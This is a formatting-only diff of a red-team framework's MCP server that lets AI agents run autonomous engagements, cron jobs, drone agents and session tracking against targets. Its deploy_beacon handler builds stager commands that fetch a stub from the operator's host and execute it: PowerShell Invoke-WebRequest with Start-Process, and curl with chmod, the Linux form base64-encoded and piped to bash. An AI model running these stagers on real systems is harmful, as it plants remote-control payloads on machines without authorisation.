     # ── rag_query ─────────────────────────────────────────────────────────────
     elif name == "lazyown_rag_query":
         rq_query = arguments.get("query", "").strip()
-        rq_n     = int(arguments.get("n", 5))
+        rq_n = int(arguments.get("n", 5))
         if not rq_query:
             return text("[rag_query] 'query' is required.")
         try:
             sys.path.insert(0, str(MODULES_DIR))
             from session_rag import get_rag as _get_rag
+
             _rag = _get_rag()
             # Trigger incremental index first so newly created files are visible
             await asyncio.get_event_loop().run_in_executor(None, _rag.index_new)
-            hits = await asyncio.get_event_loop().run_in_executor(
-                None, lambda: _rag.query(rq_query, rq_n)
-            )
+            hits = await asyncio.get_event_loop().run_in_executor(None, lambda: _rag.query(rq_query, rq_n))
             if not hits:
                 return text("No results found. Run lazyown_rag_index first.")
             lines = [f"RAG query: '{rq_query}'  ({len(hits)} hits)\n"]
@@ -9531,6 +9787,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         try:
             sys.path.insert(0, str(MODULES_DIR))
             from threat_model import get_builder as _get_tm_builder
+
             _tmb = _get_tm_builder()
             if tm_action == "load":
                 model = _tmb.load()
@@ -9542,12 +9799,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             if tm_action in ("build", "load"):
                 s = model.get("summary", {})
                 lines = [
-                    f"Threat Model  generated_at={model.get('generated_at','')}",
-                    f"  Assets:          {len(model.get('assets', []))}  (highest risk: {s.get('highest_risk_asset','')})",
-                    f"  TTPs:            {len(model.get('ttps', []))}  (dominant tactic: {s.get('dominant_tactic','')})",
+                    f"Threat Model  generated_at={model.get('generated_at', '')}",
+                    f"  Assets:          {len(model.get('assets', []))}  (highest risk: {s.get('highest_risk_asset', '')})",
+                    f"  TTPs:            {len(model.get('ttps', []))}  (dominant tactic: {s.get('dominant_tactic', '')})",
                     f"  IOCs:            {len(model.get('ioc_registry', []))}",
                     f"  Detection rules: {len(model.get('detection_rules', []))}",
-                    f"  Total events:    {s.get('total_events',0)}",
+                    f"  Total events:    {s.get('total_events', 0)}",
                     "",
                     "Top 5 TTPs:",
                 ]
@@ -9564,17 +9821,14 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 lines = [f"TTPs ({len(ttps)}):"]
                 for t in ttps:
                     lines.append(
-                        f"  {t['technique_id']:12s} [{t['severity']:8s}]  "
-                        f"{t['technique_name']}  (x{t['occurrences']})"
+                        f"  {t['technique_id']:12s} [{t['severity']:8s}]  {t['technique_name']}  (x{t['occurrences']})"
                     )
                 return text("\n".join(lines))
             elif tm_action == "rules":
                 rules = model.get("detection_rules", [])
                 lines = [f"Detection Rules ({len(rules)}):"]
                 for r in rules:
-                    lines.append(
-                        f"  {r['rule_id']}  [{r['severity']:8s}]  {r['name']}"
-                    )
+                    lines.append(f"  {r['rule_id']}  [{r['severity']:8s}]  {r['name']}")
                     lines.append(f"    log_source: {r['log_source']}  |  condition: {r['condition']}")
                     lines.append(f"    response: {r['response']}")
                 return text("\n".join(lines))
@@ -9591,10 +9845,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 lines = [f"Purple Team Mapping ({len(purple)} TTPs)\n"]
                 for p in purple:
                     gap_str = "  [COVERAGE GAP]" if p["gap"] else ""
-                    lines.append(
-                        f"{p['technique_id']:12s} [{p['severity']:8s}]  "
-                        f"{p['technique_name']}{gap_str}"
-                    )
+                    lines.append(f"{p['technique_id']:12s} [{p['severity']:8s}]  {p['technique_name']}{gap_str}")
                     r = p["red"]
                     lines.append(
                         f"  RED : {', '.join(r['commands'])}  "
@@ -9610,20 +9861,16 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 return text("\n".join(lines))
             elif tm_action == "gaps":
                 purple = model.get("purple_team", [])
-                gaps   = [p for p in purple if p["gap"]]
+                gaps = [p for p in purple if p["gap"]]
                 covered = len(purple) - len(gaps)
-                pct     = round(covered / len(purple) * 100) if purple else 0
+                pct = round(covered / len(purple) * 100) if purple else 0
                 lines = [
                     f"Detection Coverage: {covered}/{len(purple)} TTPs covered ({pct}%)",
                     f"Coverage gaps: {len(gaps)}\n",
                 ]
                 for p in gaps:
-                    lines.append(
-                        f"  {p['technique_id']:12s} [{p['severity']:8s}]  {p['technique_name']}"
-                    )
-                    lines.append(
-                        f"    Commands: {', '.join(p['red']['commands'])}"
-                    )
+                    lines.append(f"  {p['technique_id']:12s} [{p['severity']:8s}]  {p['technique_name']}")
+                    lines.append(f"    Commands: {', '.join(p['red']['commands'])}")
                 if not gaps:
                     lines.append("  All detected TTPs have a detection rule.")
                 return text("\n".join(lines))
@@ -9633,25 +9880,28 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── groq_agent ───────────────────────────────────────────────────────────
     elif name == "lazyown_groq_agent":
-        ga_goal       = arguments.get("goal", "").strip()
+        ga_goal = arguments.get("goal", "").strip()
         if not ga_goal:
             return text("[groq_agent] 'goal' is required.")
-        ga_tools      = arguments.get("tools_filter") or None
-        ga_backend    = arguments.get("backend", "groq")
-        ga_max_iter   = int(arguments.get("max_iterations", 8))
-        ga_async      = bool(arguments.get("async_mode", False))
+        ga_tools = arguments.get("tools_filter") or None
+        ga_backend = arguments.get("backend", "groq")
+        ga_max_iter = int(arguments.get("max_iterations", 8))
+        ga_async = bool(arguments.get("async_mode", False))
         ga_sys_prompt = arguments.get("system_prompt", "")
         try:
             sys.path.insert(0, str(SKILLS_DIR))
             from lazyown_groq_agents import get_pool as _groq_pool
-            cfg     = _load_payload()
+
+            cfg = _load_payload()
             api_key = cfg.get("api_key", "") or os.environ.get("GROQ_API_KEY", "")
-            pool    = _groq_pool()
+            pool = _groq_pool()
 
             if ga_async:
                 agent_id = pool.spawn(
-                    goal=ga_goal, tools_filter=ga_tools,
-                    api_key=api_key, backend=ga_backend,
+                    goal=ga_goal,
+                    tools_filter=ga_tools,
+                    api_key=api_key,
+                    backend=ga_backend,
                     max_iterations=ga_max_iter,
                     system_prompt=ga_sys_prompt,
                     block=False,
@@ -9669,17 +9919,17 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             # MCP async event loop while the agent iterates.
             def _blocking_run() -> str:
                 aid = pool.spawn(
-                    goal=ga_goal, tools_filter=ga_tools,
-                    api_key=api_key, backend=ga_backend,
+                    goal=ga_goal,
+                    tools_filter=ga_tools,
+                    api_key=api_key,
+                    backend=ga_backend,
                     max_iterations=ga_max_iter,
                     system_prompt=ga_sys_prompt,
                     block=True,
                 )
                 return pool.result(aid)
 
-            answer = await asyncio.get_event_loop().run_in_executor(
-                None, _blocking_run
-            )
+            answer = await asyncio.get_event_loop().run_in_executor(None, _blocking_run)
             return text(answer)
 
         except Exception as exc:
@@ -9714,10 +9964,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_hive():
             return text("[hive] hive_mind.py not importable")
         try:
-            return text(_hive_recall(
-                query=arguments.get("query", ""),
-                top_k=int(arguments.get("top_k", 10)),
-            ))
+            return text(
+                _hive_recall(
+                    query=arguments.get("query", ""),
+                    top_k=int(arguments.get("top_k", 10)),
+                )
+            )
         except Exception as exc:
             return text(f"[hive_recall error] {exc}")
 
@@ -9725,10 +9977,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_hive():
             return text("[hive] hive_mind.py not importable")
         try:
-            return text(_hive_plan(
-                goal=arguments.get("goal", ""),
-                n_drones=int(arguments.get("n_drones", 0)),
-            ))
+            return text(
+                _hive_plan(
+                    goal=arguments.get("goal", ""),
+                    n_drones=int(arguments.get("n_drones", 0)),
+                )
+            )
         except Exception as exc:
             return text(f"[hive_plan error] {exc}")
 
@@ -9744,10 +9998,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_hive():
             return text("[hive] hive_mind.py not importable")
         try:
-            return text(_hive_collect(
-                drone_ids_csv=arguments.get("drone_ids_csv", ""),
-                goal=arguments.get("goal", ""),
-            ))
+            return text(
+                _hive_collect(
+                    drone_ids_csv=arguments.get("drone_ids_csv", ""),
+                    goal=arguments.get("goal", ""),
+                )
+            )
         except Exception as exc:
             return text(f"[hive_collect error] {exc}")
 
@@ -9755,10 +10011,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_hive():
             return text("[hive] hive_mind.py not importable")
         try:
-            return text(_hive_forget(
-                older_than_hours=float(arguments.get("older_than_hours", 24.0)),
-                topic=arguments.get("topic", ""),
-            ))
+            return text(
+                _hive_forget(
+                    older_than_hours=float(arguments.get("older_than_hours", 24.0)),
+                    topic=arguments.get("topic", ""),
+                )
+            )
         except Exception as exc:
             return text(f"[hive_forget error] {exc}")
 
@@ -9766,11 +10024,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_hive():
             return text("[hive] hive_mind.py not importable")
         try:
-            return text(_hive_recover(
-                backend=arguments.get("backend", "groq"),
-                api_key=arguments.get("api_key", ""),
-                max_iterations=int(arguments.get("max_iterations", 10)),
-            ))
+            return text(
+                _hive_recover(
+                    backend=arguments.get("backend", "groq"),
+                    api_key=arguments.get("api_key", ""),
+                    max_iterations=int(arguments.get("max_iterations", 10)),
+                )
+            )
         except Exception as exc:
             return text(f"[hive_recover error] {exc}")
 
@@ -9779,10 +10039,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_auto():
             return text("[auto] autonomous_daemon.py no importable — verifica skills/autonomous_daemon.py")
         try:
-            return text(_auto_start(
-                max_steps=int(arguments.get("max_steps", 10)),
-                backend=arguments.get("backend", "groq"),
-            ))
+            return text(
+                _auto_start(
+                    max_steps=int(arguments.get("max_steps", 10)),
+                    backend=arguments.get("backend", "groq"),
+                )
+            )
         except Exception as exc:
             return text(f"[autonomous_start error] {exc}")
 
@@ -9806,11 +10068,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_auto():
             return text("[auto] autonomous_daemon.py no importable")
         try:
-            return text(_auto_inject(
-                text=arguments.get("text", ""),
-                priority=arguments.get("priority", "high"),
-                target=arguments.get("target", ""),
-            ))
+            return text(
+                _auto_inject(
+                    text=arguments.get("text", ""),
+                    priority=arguments.get("priority", "high"),
+                    target=arguments.get("target", ""),
+                )
+            )
         except Exception as exc:
             return text(f"[autonomous_inject error] {exc}")
 
@@ -9826,6 +10090,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "skills"))
             from autonomous_replay import replay as _replay
+
             mode = str(arguments.get("mode", "trace")).strip().lower() or "trace"
             from_event_id = arguments.get("from_event_id") or None
             to_event_id = arguments.get("to_event_id") or None
@@ -9846,6 +10111,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_daemon_status":
         try:
             from daemon_control import DaemonControl as _DC
+
             state = _DC(SESSIONS_DIR).load()
             return text(json.dumps(state.to_dict(), indent=2, ensure_ascii=False))
         except Exception as exc:
@@ -9854,11 +10120,15 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_daemon_mode":
         try:
             from daemon_control import DaemonControl as _DC
+
             mode = str(arguments.get("mode", "")).strip().lower()
             state = _DC(SESSIONS_DIR).set_mode(mode)
-            return text(json.dumps(
-                {"ok": True, "mode": state.mode}, ensure_ascii=False,
-            ))
+            return text(
+                json.dumps(
+                    {"ok": True, "mode": state.mode},
+                    ensure_ascii=False,
+                )
+            )
         except ValueError as exc:
             return text(f"[daemon_mode error] {exc}")
         except Exception as exc:
@@ -9867,26 +10137,35 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_daemon_pause":
         try:
             from daemon_control import DaemonControl as _DC
+
             state = _DC(SESSIONS_DIR).pause()
-            return text(json.dumps(
-                {"ok": True, "mode": state.mode}, ensure_ascii=False,
-            ))
+            return text(
+                json.dumps(
+                    {"ok": True, "mode": state.mode},
+                    ensure_ascii=False,
+                )
+            )
         except Exception as exc:
             return text(f"[daemon_pause error] {exc}")
 
     elif name == "lazyown_daemon_resume":
         try:
             from daemon_control import DaemonControl as _DC
+
             state = _DC(SESSIONS_DIR).resume()
-            return text(json.dumps(
-                {"ok": True, "mode": state.mode}, ensure_ascii=False,
-            ))
+            return text(
+                json.dumps(
+                    {"ok": True, "mode": state.mode},
+                    ensure_ascii=False,
+                )
+            )
         except Exception as exc:
             return text(f"[daemon_resume error] {exc}")
 
     elif name == "lazyown_daemon_veto":
         try:
             from daemon_control import DaemonControl as _DC
+
             control = _DC(SESSIONS_DIR)
             action = str(arguments.get("action", "list")).strip().lower()
             command = str(arguments.get("command", "")).strip()
@@ -9899,13 +10178,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             elif action == "list":
                 state = control.load()
             else:
-                return text(
-                    f"[daemon_veto error] unknown action '{action}'; expected add|remove|clear|list"
+                return text(f"[daemon_veto error] unknown action '{action}'; expected add|remove|clear|list")
+            return text(
+                json.dumps(
+                    {"ok": True, "vetoed_commands": state.vetoed_commands},
+                    ensure_ascii=False,
                 )
-            return text(json.dumps(
-                {"ok": True, "vetoed_commands": state.vetoed_commands},
-                ensure_ascii=False,
-            ))
+            )
         except ValueError as exc:
             return text(f"[daemon_veto error] {exc}")
         except Exception as exc:
@@ -9914,51 +10193,61 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_daemon_focus":
         try:
             from daemon_control import DaemonControl as _DC
+
             targets_raw = arguments.get("targets", [])
             if not isinstance(targets_raw, list):
-                return text(
-                    "[daemon_focus error] targets must be a list of strings"
-                )
+                return text("[daemon_focus error] targets must be a list of strings")
             targets = [str(t) for t in targets_raw if isinstance(t, (str, int))]
             state = _DC(SESSIONS_DIR).set_focus(targets)
-            return text(json.dumps(
-                {"ok": True, "focus_targets": state.focus_targets},
-                ensure_ascii=False,
-            ))
+            return text(
+                json.dumps(
+                    {"ok": True, "focus_targets": state.focus_targets},
+                    ensure_ascii=False,
+                )
+            )
         except Exception as exc:
             return text(f"[daemon_focus error] {exc}")
 
     elif name == "lazyown_daemon_approve":
         try:
             from daemon_control import DaemonControl as _DC
+
             decision = str(arguments.get("decision", "approved")).strip().lower()
             operator = str(arguments.get("operator", "mcp")).strip()
             control = _DC(SESSIONS_DIR)
             pending = control.load().pending
             if pending is None:
-                return text(json.dumps(
-                    {"ok": False, "error": "no pending action"},
-                    ensure_ascii=False,
-                ))
+                return text(
+                    json.dumps(
+                        {"ok": False, "error": "no pending action"},
+                        ensure_ascii=False,
+                    )
+                )
             final = control.decide(
-                pending.action_id, decision, operator=operator,
+                pending.action_id,
+                decision,
+                operator=operator,
             )
             if final is None:
-                return text(json.dumps(
-                    {"ok": False, "error": "pending action lost during decide"},
+                return text(
+                    json.dumps(
+                        {"ok": False, "error": "pending action lost during decide"},
+                        ensure_ascii=False,
+                    )
+                )
+            return text(
+                json.dumps(
+                    {
+                        "ok": True,
+                        "action_id": final.action_id,
+                        "decision": final.decision,
+                        "command": final.command,
+                        "operator": final.operator,
+                        "decided_at": final.decided_at,
+                    },
                     ensure_ascii=False,
-                ))
-            return text(json.dumps(
-                {
-                    "ok":         True,
-                    "action_id":  final.action_id,
-                    "decision":   final.decision,
-                    "command":    final.command,
-                    "operator":   final.operator,
-                    "decided_at": final.decided_at,
-                },
-                ensure_ascii=False,
-            ))
+                )
+            )
         except ValueError as exc:
             return text(f"[daemon_approve error] {exc}")
         except Exception as exc:
@@ -9975,12 +10264,14 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             target = str(arguments.get("target", "")).strip()
             if not target:
                 return text("[engage_target error] target is required")
-            return text(_engage_call(
-                target=target,
-                max_switches_per_step=int(arguments.get("max_switches_per_step", 3)),
-                detach=bool(arguments.get("detach", True)),
-                auto=bool(arguments.get("auto", False)),
-            ))
+            return text(
+                _engage_call(
+                    target=target,
+                    max_switches_per_step=int(arguments.get("max_switches_per_step", 3)),
+                    detach=bool(arguments.get("detach", True)),
+                    auto=bool(arguments.get("auto", False)),
+                )
+            )
         except Exception as exc:
             return text(f"[engage_target error] {exc}")
 
@@ -10030,11 +10321,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             pipeline_name = str(arguments.get("name", "")).strip()
             if not pipeline_name:
                 return text("[pipeline_run error] name is required")
-            return text(_pl_run(
-                name=pipeline_name,
-                target=str(arguments.get("target", "")).strip(),
-                background=bool(arguments.get("background", False)),
-            ))
+            return text(
+                _pl_run(
+                    name=pipeline_name,
+                    target=str(arguments.get("target", "")).strip(),
+                    background=bool(arguments.get("background", False)),
+                )
+            )
         except Exception as exc:
             return text(f"[pipeline_run error] {exc}")
 
@@ -10076,12 +10369,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── session_status ────────────────────────────────────────────────────────
     elif name == "lazyown_session_status":
-        filter_id    = arguments.get("client_id", "").strip()
-        show_tasks   = bool(arguments.get("show_tasks", True))
+        filter_id = arguments.get("client_id", "").strip()
+        show_tasks = bool(arguments.get("show_tasks", True))
         show_outputs = bool(arguments.get("show_outputs", False))
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from session_reader import get_aggregator as _get_session_agg
+
             summary = _get_session_agg().aggregate(SESSIONS_DIR)
 
             lines: list[str] = []
@@ -10096,17 +10390,14 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 if rec is None:
                     continue
                 priv = "PRIVILEGED" if rec.is_privileged else "user"
-                lines.append(
-                    f"  [{priv}] {cid} | {rec.hostname} | {rec.platform} | "
-                    f"user={rec.user} | ips={rec.ips}"
-                )
+                lines.append(f"  [{priv}] {cid} | {rec.hostname} | {rec.platform} | user={rec.user} | ips={rec.ips}")
                 if rec.result_portscan:
                     lines.append(f"    portscan: {rec.result_portscan[:120]}")
                 if show_outputs and rec.output:
                     lines.append(f"    last output: {rec.output[:200]}")
 
             # -- Privileged vs unprivileged summary --
-            priv_count   = len(summary.privileged_sessions)
+            priv_count = len(summary.privileged_sessions)
             unpriv_count = len(summary.unprivileged_sessions)
             lines.append("")
             lines.append(f"Privileged sessions: {priv_count} | Unprivileged: {unpriv_count}")
@@ -10143,6 +10434,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from metrics import get_recorder as _get_recorder
+
             window_raw = int(arguments.get("window_seconds", 0) or 0)
             window = window_raw if window_raw > 0 else None
             top_n = max(1, int(arguments.get("top_n", 10)))
@@ -10160,16 +10452,17 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             return text(f"[metrics_summary error] {exc}")
 
     elif name == "lazyown_reactive_suggest":
-        raw_output    = arguments.get("output", "")
-        command       = arguments.get("command", "")
-        platform      = arguments.get("platform", "unknown")
+        raw_output = arguments.get("output", "")
+        command = arguments.get("command", "")
+        platform = arguments.get("platform", "unknown")
         max_decisions = int(arguments.get("max_decisions", 5))
         if not raw_output.strip():
             return text("[reactive_suggest] 'output' field is required.")
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from reactive_engine import get_engine as _get_react_engine
-            engine    = _get_react_engine()
+
+            engine = _get_react_engine()
             decisions = engine.analyse(
                 output=raw_output,
                 command=command,
@@ -10191,8 +10484,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 lines.append("")
             if decisions and decisions[0].priority <= 2:
                 lines.append(
-                    f"AUTO-INJECT: top decision (priority {decisions[0].priority}) "
-                    f"will be used as next auto_loop step."
+                    f"AUTO-INJECT: top decision (priority {decisions[0].priority}) will be used as next auto_loop step."
                 )
             return text("\n".join(lines))
         except Exception as exc:
@@ -10200,7 +10492,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── campaign_tasks ────────────────────────────────────────────────────────
     elif name == "lazyown_campaign_tasks":
-        action        = arguments.get("action", "list")
+        action = arguments.get("action", "list")
         filter_status = arguments.get("filter_status", "").strip()
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
@@ -10218,9 +10510,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     )
                 lines = [f"Campaign tasks ({len(tasks)}):"]
                 for t in tasks:
-                    lines.append(
-                        f"  #{t.id:3d} [{t.status:8s}] {t.title} (op={t.operator})"
-                    )
+                    lines.append(f"  #{t.id:3d} [{t.status:8s}] {t.title} (op={t.operator})")
                     if t.description:
                         lines.append(f"         {t.description[:100]}")
                 return text("\n".join(lines))
@@ -10229,27 +10519,27 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 title = arguments.get("title", "").strip()
                 if not title:
                     return text("[campaign_tasks] 'title' is required for action='add'.")
-                desc     = arguments.get("description", "")
+                desc = arguments.get("description", "")
                 operator = arguments.get("operator", "agent")
-                status   = arguments.get("status", "New")
-                writer   = _TaskWriter(SESSIONS_DIR)
-                task     = writer.append(
-                    title=title, description=desc,
-                    operator=operator, status=status,
+                status = arguments.get("status", "New")
+                writer = _TaskWriter(SESSIONS_DIR)
+                task = writer.append(
+                    title=title,
+                    description=desc,
+                    operator=operator,
+                    status=status,
                 )
-                return text(
-                    f"Task #{task.id} created: [{task.status}] {task.title} (op={task.operator})"
-                )
+                return text(f"Task #{task.id} created: [{task.status}] {task.title} (op={task.operator})")
 
             elif action == "update":
                 task_id = arguments.get("task_id")
                 if task_id is None:
                     return text("[campaign_tasks] 'task_id' is required for action='update'.")
-                status  = arguments.get("status", "")
+                status = arguments.get("status", "")
                 if not status:
                     return text("[campaign_tasks] 'status' is required for action='update'.")
-                writer  = _TaskWriter(SESSIONS_DIR)
-                ok      = writer.update_status(int(task_id), status)
+                writer = _TaskWriter(SESSIONS_DIR)
+                ok = writer.update_status(int(task_id), status)
                 if ok:
                     return text(f"Task #{task_id} updated to status '{status}'.")
                 return text(f"Task #{task_id} not found.")
@@ -10260,7 +10550,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── cron_schedule ─────────────────────────────────────────────────────────
     elif name == "lazyown_cron_schedule":
-        action   = arguments.get("action", "list")
+        action = arguments.get("action", "list")
         cron_dir = SESSIONS_DIR / "crons"
 
         def _load_crons() -> list[dict]:
@@ -10269,6 +10559,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 return []
             try:
                 import json as _json
+
                 return _json.loads(path.read_text(encoding="utf-8"))
             except Exception:
                 return []
@@ -10277,9 +10568,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             cron_dir.mkdir(parents=True, exist_ok=True)
             path = cron_dir / "scheduled.json"
             import json as _json
+
             tmp = str(path) + ".tmp"
             Path(tmp).write_text(_json.dumps(entries, indent=2), encoding="utf-8")
             import os as _os
+
             _os.replace(tmp, str(path))
 
         if action == "list":
@@ -10292,27 +10585,32 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             lines = [f"Scheduled crons ({len(entries)}):"]
             for e in entries:
                 lines.append(
-                    f"  [{e.get('id','?')}] {e.get('time','?')} -> "
-                    f"{e.get('command','')} {e.get('args','')}"
+                    f"  [{e.get('id', '?')}] {e.get('time', '?')} -> {e.get('command', '')} {e.get('args', '')}"
                 )
             return text("\n".join(lines))
 
         elif action == "add":
             cron_time = arguments.get("time", "").strip()
-            command   = arguments.get("command", "").strip()
+            command = arguments.get("command", "").strip()
             if not cron_time or not command:
                 return text("[cron_schedule] 'time' (HH:MM) and 'command' are required.")
             import re as _re
+
             if not _re.match(r"^\d{2}:\d{2}$", cron_time):
                 return text(f"[cron_schedule] Invalid time format '{cron_time}'. Use HH:MM.")
             cron_args = arguments.get("args", "").strip()
-            entries   = _load_crons()
+            entries = _load_crons()
             import uuid as _uuid
-            new_id    = str(_uuid.uuid4())[:8]
-            entries.append({
-                "id": new_id, "time": cron_time,
-                "command": command, "args": cron_args,
-            })
+
+            new_id = str(_uuid.uuid4())[:8]
+            entries.append(
+                {
+                    "id": new_id,
+                    "time": cron_time,
+                    "command": command,
+                    "args": cron_args,
+                }
+            )
             _save_crons(entries)
             # Also run via LazyOwn cron system
             full_cron_cmd = f"cron {cron_time} {command}"
@@ -10320,8 +10618,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 full_cron_cmd += f" {cron_args}"
             _run_lazyown_command(full_cron_cmd, timeout=10)
             return text(
-                f"Cron #{new_id} added: {cron_time} -> {command} {cron_args}\n"
-                f"LazyOwn cron registered: {full_cron_cmd}"
+                f"Cron #{new_id} added: {cron_time} -> {command} {cron_args}\nLazyOwn cron registered: {full_cron_cmd}"
             )
 
         elif action == "remove":
@@ -10329,7 +10626,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             if not cron_id:
                 return text("[cron_schedule] 'cron_id' is required for action='remove'.")
             entries = _load_crons()
-            before  = len(entries)
+            before = len(entries)
             entries = [e for e in entries if e.get("id") != cron_id]
             if len(entries) == before:
                 return text(f"Cron ID '{cron_id}' not found.")
@@ -10342,14 +10639,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_soul":
         if not _ensure_objectives():
             return text("Objective store unavailable.")
-        action  = arguments.get("action", "read")
+        action = arguments.get("action", "read")
         if action == "write":
             content = arguments.get("content", "")
             if not content.strip():
                 return text("content must not be empty when action='write'.")
-            await asyncio.get_event_loop().run_in_executor(
-                None, lambda: _write_soul(content)
-            )
+            await asyncio.get_event_loop().run_in_executor(None, lambda: _write_soul(content))
             return text("soul.md updated.")
         else:
             soul = await asyncio.get_event_loop().run_in_executor(None, _read_soul)
@@ -10357,7 +10652,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── deploy_beacon ─────────────────────────────────────────────────────────
     elif name == "lazyown_deploy_beacon":
-        do_compile    = arguments.get("compile", True)
+        do_compile = arguments.get("compile", True)
         plat_override = (arguments.get("platform_override") or "").strip().lower()
 
         def _deploy_beacon_sync() -> str:
@@ -10406,18 +10701,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
             if platform == "windows":
                 stub_url = f"http://{lhost}/stub.exe"
-                cmd = (
-                    f"powershell -c \"Invoke-WebRequest '{stub_url}' "
-                    f"-OutFile 'stub.exe'; Start-Process 'stub.exe'\""
-                )
+                cmd = f"powershell -c \"Invoke-WebRequest '{stub_url}' -OutFile 'stub.exe'; Start-Process 'stub.exe'\""
             elif platform == "mac":
                 cmd = f"curl http://{lhost}/stub -o /tmp/stub && chmod +x /tmp/stub && /tmp/stub"
             else:
                 import base64 as _b64
-                raw = (
-                    f"curl http://{lhost}/stub -o /tmp/stub && "
-                    f"[ -s /tmp/stub ] && chmod +x /tmp/stub && /tmp/stub"
-                )
+
+                raw = f"curl http://{lhost}/stub -o /tmp/stub && [ -s /tmp/stub ] && chmod +x /tmp/stub && /tmp/stub"
                 encoded = _b64.b64encode(raw.encode()).decode()
                 cmd = f"echo '{encoded}' | base64 -d | bash"
 
@@ -10425,6 +10715,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             clip_note = ""
             try:
                 import subprocess as _sp
+
                 _sp.run(
                     ["xclip", "-sel", "clip"],
                     input=cmd.encode(),
@@ -10435,6 +10726,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             except FileNotFoundError:
                 try:
                     import subprocess as _sp
+
                     _sp.run(
                         ["xsel", "--clipboard", "--input"],
                         input=cmd.encode(),
@@ -10465,10 +10757,10 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── create_tool ───────────────────────────────────────────────────────────
     elif name == "lazyown_create_tool":
-        toolname  = arguments["toolname"]
-        command   = arguments["command"]
-        trigger   = arguments["trigger"]
-        active    = bool(arguments.get("active", True))
+        toolname = arguments["toolname"]
+        command = arguments["command"]
+        trigger = arguments["trigger"]
+        active = bool(arguments.get("active", True))
         try:
             tools_dir = LAZYOWN_DIR / "tools"
             written = await asyncio.get_event_loop().run_in_executor(
@@ -10492,15 +10784,15 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _PDB_AVAILABLE or _pdb is None:
             return text("ParquetDB unavailable. Run: pip install pandas pyarrow")
 
-        mode        = arguments.get("mode", "context")
-        cfg         = _load_payload()
-        target      = arguments.get("target") or cfg.get("rhost") or None
-        phase       = arguments.get("phase", "recon")
-        keyword     = arguments.get("keyword", "")
+        mode = arguments.get("mode", "context")
+        cfg = _load_payload()
+        target = arguments.get("target") or cfg.get("rhost") or None
+        phase = arguments.get("phase", "recon")
+        keyword = arguments.get("keyword", "")
         parquet_name = arguments.get("parquet")
         success_only = bool(arguments.get("success_only", False))
-        limit       = int(arguments.get("limit", 15))
-        do_sync     = bool(arguments.get("sync", False))
+        limit = int(arguments.get("limit", 15))
+        do_sync = bool(arguments.get("sync", False))
 
         def _run_parquet_query() -> str:
             if do_sync:
@@ -10522,15 +10814,15 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 for stem, rows in results.items():
                     out_parts.append(f"\n── {stem} ({len(rows)} matches) ──")
                     for r in rows[:5]:
-                        out_parts.append(
-                            json.dumps({k: str(v)[:100] for k, v in r.items()}, ensure_ascii=False)
-                        )
+                        out_parts.append(json.dumps({k: str(v)[:100] for k, v in r.items()}, ensure_ascii=False))
